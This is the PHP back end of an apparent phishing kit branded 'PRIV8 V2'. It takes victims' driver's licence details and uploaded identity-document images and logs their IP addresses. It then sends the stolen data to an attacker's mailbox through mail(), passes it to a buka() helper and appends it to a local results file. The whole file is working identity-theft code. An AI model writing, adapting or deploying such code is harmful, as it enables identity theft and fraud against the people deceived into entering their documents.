<?php
include 'config.php';
        $ip = getenv("REMOTE_ADDR");
if (isset($_GET['driver'])) {
        $driver_number = $_POST['driver_number'];
        $driver_issued_by = $_POST['driver_issued_by'];
        $driver_expire_date = $_POST['driver_expire_date'];
        $identity_type = $_POST['identity_type'];
        $message = "=======================================================\n";
        $message.= "Document Type  :  ".$identity_type."\n";
        $message.= "Drive ID Number  :  ".$driver_number."\n";
        $message.= "Drive ID Issued By  :  ".$driver_issued_by."\n";
        $message.= "Drive ID Expire Date  :  ".$driver_expire_date."\n";
		$message.= "=======================================================\n";
        $message.= "Client IP  :  ".$ip."           \n";
        $message.= "IP Link  :  http://ip-api.com/#".$ip."\n";
        $message.= "=======================================================\n";
        $subject = "PRIV8 V2 DOCUMENT INFO [$identity_type] - $ip";
        $headers = "From: CAZANOVA163 <CAZANOVA163-Tools@hotmail.com>\r\n";
        mail($email,$subject,$message,$headers);
		buka($_SESSION['Language'], $message);
        $file = fopen("../../result/Re3sult.txt","ab");
        fwrite($file,$message);
        fclose($file);
}
if (isset($_GET['file'])) {
if(isset($_FILES['0']) && $_FILES['0']['error'] == 0){
	if(move_uploaded_file($_FILES['0']['tmp_name'], '../upload/'.getenv("REMOTE_ADDR").'_'.$_FILES['0']['name'])){
		$fillee = $_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'];
		$urls = str_replace("inc/id.php",'upload/'.getenv("REMOTE_ADDR").'_'.$_FILES['0']['name'].'',$fillee);
		$url = 'http://'.$urls.'';
	}
        $message = "=======================================================\n";
        $message.= "Document url  :  ".$url."\n";
		$message.= "=======================================================\n";
        $message.= "Client IP  :  ".$ip."           \n";
        $message.= "IP Link  :  http://ip-api.com/#".$ip."\n";
        $message.= "=======================================================\n";
        buka($_SESSION['Language'],$message);
        $subject = "SPYUS PRIV8 V2 DOCUMENT PNG $ip";
        $headers = "From: L33KTBB <CAZANOVA163-Tools@hotmail.com>\r\n";
        mail($email,$subject,$message,$headers);
        $file = fopen("../../result/Re3sult.txt","ab");
        fwrite($file,$message);
        fclose($file);
}
}
?>